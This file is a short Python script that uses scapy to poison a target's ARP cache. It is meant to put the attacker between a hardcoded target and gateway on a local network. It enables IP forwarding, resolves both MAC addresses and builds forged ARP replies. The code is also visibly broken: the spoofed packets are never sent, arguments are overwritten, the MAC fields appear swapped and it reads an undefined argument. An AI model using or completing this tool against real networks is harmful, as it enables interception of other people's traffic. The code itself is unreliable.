#!/usr/bin/python3
from scapy.all import *
import argparse


def checkProc():
    with open('/proc/sys/net/ipv4/ip_forward') as f:
        if f.read() == 0:
            f.seek(0)
            f.write(1)
            f.truncate()
            print("Overwritten /proc/sys/net/ipv4/ip_forward val to 1")


def poison(target, macaddr, gateway):
    target = "192.168.69.111"
    gateway = "192.168.69.42"

    # find the address of both the target and the gateway
    #   hwsrc/hwdst = MAC address.  psrc/pdst = IP address
    
    # pick up the MAC address of the gateway for later
    getArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gateway)
    response = srp(getArp, timeout=5)
    gatewayMac = response[0][0][1].hwsrc
    
    # now get the MAC address of our target
    getTgtArp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target)
    response = srp(getTgtArp, timeout=5)
    targetMac = response[0][0][1].hwsrc

    # now send the gateway's details to the target
    gatewaySpoof = ARP(op=2, psrc=gateway, pdst=target, hwdst=gatewayMac)

    # then trick the target
    targetSpoof = ARP(op=2, psrc=target, pdst=gateway, hwdst=targetMac)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Poison a target''s ARP cache with a given MAC address')
    parser.add_argument('-t', metavar='target', help='the target whose ARP cache we''re going for')
    parser.add_argument('-m', metavar='mac', help='the MAC address we are spoofing')
    parser.add_argument('-g', metavar='gateway', help='the gateway we are fooling')

    checkProc()

    args = parser.parse_args()
    target = args.t
    macaddr = args.v
    gateway = ""
    poison(target, macaddr, gateway)
